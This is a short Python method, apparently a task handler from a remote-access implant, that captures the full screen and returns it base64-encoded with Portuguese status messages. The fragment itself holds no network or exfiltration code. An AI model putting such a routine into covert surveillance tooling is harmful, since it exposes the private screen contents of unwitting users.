    def screenshot2(self, task_id, input):
        try:
            import io, base64
            from PIL import ImageGrab

            img = ImageGrab.grab()
            buffer = io.BytesIO()
            img.save(buffer, format="PNG")
            data = base64.b64encode(buffer.getvalue()).decode()

            return f"[+] Screenshot capturado\n{data}"
        except Exception as e:
            return f"[!] Erro: {str(e)}"
